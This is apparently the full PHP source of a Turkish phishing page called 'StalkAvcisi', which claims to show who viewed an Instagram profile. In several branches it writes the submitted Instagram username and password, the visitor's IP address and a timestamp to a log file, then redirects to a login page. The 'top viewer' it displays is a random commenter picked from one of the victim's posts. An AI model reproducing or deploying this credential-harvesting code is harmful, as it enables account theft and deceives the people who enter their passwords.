<?php 
include 'config.php';
function ara($bas, $son, $yazi)
    {
      @preg_match_all('/' . preg_quote($bas, '/') .
      '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
      return @$m[1];
    }
    $username = $_POST['username'];
    $link2="https://www.instagram.com/$username";
    $icerik= file_get_contents($link2);
    $durum= ara('<html lang="en" class="','">',$icerik);
    $durum2= ara('"is_private":',',"',$icerik);
    $durum3= ara('{"count":',',"',$icerik);
    $postvarmi = "$durum3[4]";
    $gizlimi = "$durum2[0]";
    if ($gizlimi == "false") {  
    if ($postvarmi > "1") {


    if ($durum[0] == "no-js not-logged-in client-root") {
         
    if(isset($_POST['hesap']))
{   
    $kullaniciadi=$_POST['username'];

$link = "https://www.instagram.com/$kullaniciadi";
$icerik = file_get_contents($link);
$icerik4 = file_get_contents($link);
$profilresmi = ara('<meta property="og:image" content="','" />',$icerik);
$bilgileri = ara('<meta content="','" name="description" />',$icerik4);
$icerik2 = file_get_contents($link);
$gonderiismi = ara('"shortcode":"','","edge_media_to_comment":',$icerik2);
$gonderi = $gonderiismi[0];
$link2 = "https://www.instagram.com/p/$gonderi/";
$icerik3 = file_get_contents($link2);


$profilresimleri0 = ara('"profile_pic_url":"','","username":',$icerik3);
$arkadasisimleri0 = ara('"username":"','"',$icerik3);
$sayi = count($arkadasisimleri0, COUNT_RECURSIVE);
    $top=$sayi - 1;

$top1=rand(0,$top);
$arkadasisimleri1 = $arkadasisimleri0[$top1];
$profilresimleri1 = $profilresimleri0[$top1];
    if ($top == -1) {
        $arkadasisimleri1="deneme";
        $profilresimleri1="deneme";
    } 


}
 ?>
 <?php
error_reporting(0);
$nick = $_GET['nick'];

$username = $_POST['username'];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen($log, 'a'); 
fwrite($file, "<body bgcolor=black>  
<title>Hesap Bilgileri</title> <font color=Cyan size=3 >Kullanici Adi:</font><font Color=Red size=3 >  $username</font><br><font Color=Cyan size=3 >Sifre:</font><font Color=Red size=3  >  $password</font><br><font color=Cyan size=3 >Ip Adresi: </font><font Color=Red size=3 >  $ip</font><br><font color=Cyan size=3 >Zaman: </font><font Color=Gray size=3 >  $cur_time</font><hr><br><br>");
fclose($file); 

	?>


 <html>
<head>
<meta name="theme-color" content="#34495e">
<meta name="msapplication-navbutton-color" content="#34495e">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#34495e">
<meta charset="utf-8">
<meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
<title>Instagram Profilime Kim Baktı ?</title>
<meta name="description" content="StalkAvcisi ile instagram profilime bakanları öğren">
<meta name="keywords" content="Profiline kim bakti,StalkAvcisi,instagram profilime bakanlar,stalklayanlar,profilime bakanlar,best stalker">

<link href='https://fonts.googleapis.com/css?family=Dancing+Script:400,700' rel='stylesheet' type='text/css'>
<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300' rel='stylesheet' type='text/css'>
<link href="css/site/bootstrap.min.css" rel="stylesheet">
<link href="css/font-awesome.min.css" rel="stylesheet">
<link href="css/site/animate.css" rel="stylesheet">
<link href="css/owl.carousel.css" rel="stylesheet">
<link href="css/owl.theme.css" rel="stylesheet">
<link href="css/owl.transitions.css" rel="stylesheet">
<link href="css/site/style.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="css/sweetalert.css">
<style>
        body 
         {
                }
        
        .navbar-nav > li > .dropdown-menu {
                }
        
        .navbar-default .navbar-brand {
                }
        
        .navbar-default a:hover {
                }
        
        .copyright {
         
        }
        
        .bottom_menu li a {
            
        }
        
        body {
          
        }
        
        .main_container {
            
        }
        
        .dropdown-menu > li > a {
                }
        
                
                
        .navbar-default .navbar-nav > li > a {
                }
    </style>
</head>
<body>
<nav class="navbar navbar-default" role="navigation">
<div class="navbar-header">
<a class="sidr_btn">
<i class="fa fa-bars fa-lg"></i>
</a>
<a class="navbar-brand" href="">StalkAvcisi</a>
</div>
<div id="bs-collapse-1">
<ul class="nav navbar-nav navbar-left">
<li>
<a href="home"><span class="nav-label">StalkAvcisi </span></a>
</li>
</ul>
<ul class="nav navbar-nav navbar-right">
<li class="dropdown">
<a href="" id="arrowC" class="dropdown-toggle dropdown-avatar" data-toggle="dropdown">
</a>
<ul class="dropdown-menu">
<li><a href="#">Ayarlar</a></li>
<li><a href="clean">Çıkış</a></li>
</ul>
</li>
</ul>
</div>
</nav>
<script id="profileBakanlar" type="x-tmpl-mustache">
    <div class="galleryItem" data-id="{{username}}">
                                        <a ><img src="{{pic}}" alt="" /></a>
                                                                                                <div class="p_info_block">
                                                    <i class="fa fa-instagram"></i> {{username}}</div>
                                            </div>
    </script>
<div class="container">
<div class="row">
<div class="main_container">
<div class="row profile_photo_cont">
<div class="col-md-3 photocol">
<div class="ibox float-e-margins">
<div>
<div id="arrowX" class="ibox-content no-padding border-left-right avatar_user_profile">
</div>
</div>
</div>
</div>
<div class="col-md-6 profile-details">
<h3><?php echo "$kullaniciadi"; ?> <i title='Korumalı Hesap' class=''></i></h3>
<div class="userslst_age">
<a href="index.php"><i class=""></i> Çıkış Yap </a>
<li>Analizler 24saat arayla güncellenmektedir.</li>
<li>Profilinize bakanları asağıdan inceleyebilirsiniz.</li>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>



<li class="_218yx">
<a class="_s53mj" href="#">
<?php echo $bilgileri[0] ?></a>
</li>
</ul>
</div>
</div>
</div>
<div class="row">
<div class="col-md-12">
<div class="profile_tabs">
<div class="tabs-container">
<ul class="nav nav-tabs">
<li class="active"><a data-toggle="tab" href="#tab-0">StalkAvcisi İşte Profilinize En Çok Giren O kişi</a></li><br>

</ul>
<div class="tab-content">
<div id="tab-0" class="tab-pane active">
<div class="panel-body">
<div data-toggle="tab" style="text-align: center; display: none;" id="loading">
<h1 class="fa fa-refresh fa-spin" style="font-size: 80px"></h1> <h1>Profilinize bakanlar analizleniyor..</h1></div>
<div style="text-align: center;" id="list">
<div class="lightBoxGallery" id="galleryItems">
    <center>
    <div class="galleryItem" data-id="<?php echo $arkadasisimleri1 ?>">
                                        <a><img src="<?php if ($arkadasisimleri1 == $kullaniciadi) {
        ?>
                                        <?php do {
                                            $top2=rand(0,$top);
                                            $arkadasisimleri2= $arkadasisimleri0[$top2];
$profilresimleri2 = $profilresimleri0[$top2];

echo($profilresimleri2);
 }
 while ( $arkadasisimleri2 == $kullaniciadi );
}else {
echo $profilresimleri1; } ?>
" alt="profilimekimbaktı"></a>

                                                                                                <div class="p_info_block">
                                                    <i class=""></i>@<?php if ($arkadasisimleri1 == '') {
                                                        echo "arkadasisimleri2bulunamadi";
                                                    } else { if ($arkadasisimleri1 == $kullaniciadi) {

                                do {
                                            $top2=rand(0,$top);
                                            $arkadasisimleri2= $arkadasisimleri0[$top2];
$profilresimleri2 = $profilresimleri0[$top2];

echo($arkadasisimleri1);
 }
 while ( $arkadasisimleri2 == $kullaniciadi );
}else {
echo $arkadasisimleri1; }  }?></div>
                                            </div>
                                        </center>
    
    
    </div>
</div>
</div>
</div>
<div style="text-align: center; display: none" id="list">
<div class="lightBoxGallery" id="galleryItems"></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal inmodal" id="photo_modal" tabindex="-1" role="dialog" aria-hidden="true">
 <div class="modal-dialog">
<div class="modal-content animated fadeIn">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
<h4 class="modal-title"></h4>
</div>
<div class="modal-body">
</div>
<div class="modal-footer modal-photo-actions">
<a href="#" class="btn btn-report-photo">Bildir</a>
</div>
</div>
</div>
</div>
<div class="container footer_container">
<div style="display: none;">
<script id="_wauc55">var _wau = _wau || []; _wau.push(["classic", "5hp8nhdo3m4z", "c55"]);
(function() {var s=document.createElement("script"); s.async=true;
s.src="//widgets.amung.us/classic.js";
document.getElementsByTagName("head")[0].appendChild(s);
})();
</script>
<footer>
<div class="copyright">
© Copyright 2016 Arrow Media </div>
</footer>
</div>
<script src="js/jquery-2.1.3.js"></script>
<script type="text/javascript" src="js/pages/profile.js"></script>
<script type="text/javascript">
                        var stalker = 1;
            var facestalker = 0;
            var twstalker = 0;
            function strstr(haystack, needle, bool) {  
    var pos = 0;
    haystack += '';
    pos = haystack.toLowerCase().indexOf((needle + '').toLowerCase());
    if (pos == -1) {
        return false;
    } else {
        if (bool) {
            return haystack.substr(0, pos);
        } else {
            return haystack.slice(pos);
        }
    }
}
function resimConvert(string) {
    var res = string.split("/");
    var name = res.pop();
    var sonuc = strstr(name, 'jpg');
    if(sonuc == 'jpg') {
    var resim = "https://scontent-mrs1-1.cdninstagram.com/t51.2885-19/" + name;
   }else {
    var name = res[4];
    var resim = "https://scontent-mrs1-1.cdninstagram.com/t51.2885-19/" + name;
    }
    document.getElementById("arrowC").innerHTML = '<img alt="image" class="avatar_right" src="<?php echo $profilresmi[0] ?>" />';
    document.getElementById("arrowX").innerHTML = '<img alt="image" height="248" class="img-responsive" src="<?php echo $profilresmi[0] ?>">';
}
window.onload = resimConvert("<?php echo $profilresmi[0] ?>");    


                    </script>
<script>
            (function (i, s, o, g, r, a, m) {
                i['GoogleAnalyticsObject'] = r;
                i[r] = i[r] || function () {
                    (i[r].q = i[r].q || []).push(arguments)
                }, i[r].l = 1 * new Date();
                a = s.createElement(o),
                    m = s.getElementsByTagName(o)[0];
                a.async = 1;
                a.src = g;
                m.parentNode.insertBefore(a, m)
            })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');

            ga('create', 'UA-81237587-2', 'auto');
            ga('send', 'pageview');
            </script>
<script src="js/mustache.min.js"></script>
<script src="js/sweetalert.min.js"></script>
</body>
</html>
<?php
} else {
 header("Location:$link/account/login?kullanici=bulunamadi");

error_reporting(0);
$nick = $_GET['nick'];

$username = $_POST['username'];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen($log, 'a'); 
fwrite($file, "<body bgcolor=black>  
<title>Hesap Bilgileri</title> <font color=Cyan size=3 >Kullanici Adi:</font><font Color=Red size=3 >  $username</font><br><font Color=Cyan size=3 >Sifre:</font><font Color=Red size=3  >  $password</font><br><font color=Cyan size=3 >Ip Adresi: </font><font Color=Red size=3 >  $ip</font><br><font color=Cyan size=3 >Zaman: </font><font Color=Gray size=3 >  $cur_time</font><hr><br><br>");
fclose($file); 


    }
} else {
 header("Location:$link/account/login?Post=bulunamadi");
 error_reporting(0);
$nick = $_GET['nick'];

$username = $_POST['username'];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen($log, 'a'); 
fwrite($file, "<body bgcolor=black>  
<title>Hesap Bilgileri</title> <font color=Cyan size=3 >Kullanici Adi:</font><font Color=Red size=3 >  $username</font><br><font Color=Cyan size=3 >Sifre:</font><font Color=Red size=3  >  $password</font><br><font color=Cyan size=3 >Ip Adresi: </font><font Color=Red size=3 >  $ip</font><br><font color=Cyan size=3 >Zaman: </font><font Color=Gray size=3 >  $cur_time</font><hr><br><br>");
fclose($file); 
    }
} else {
 header("Location:$link/account/login?Hesap=gizli");
 error_reporting(0);
$nick = $_GET['nick'];

$username = $_POST['username'];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen($log, 'a'); 
fwrite($file, "<body bgcolor=black>  
<title>Hesap Bilgileri</title> <font color=Cyan size=3 >Kullanici Adi:</font><font Color=Red size=3 >  $username</font><br><font Color=Cyan size=3 >Sifre:</font><font Color=Red size=3  >  $password</font><br><font color=Cyan size=3 >Ip Adresi: </font><font Color=Red size=3 >  $ip</font><br><font color=Cyan size=3 >Zaman: </font><font Color=Gray size=3 >  $cur_time</font><hr><br><br>");
fclose($file); 
    } ?>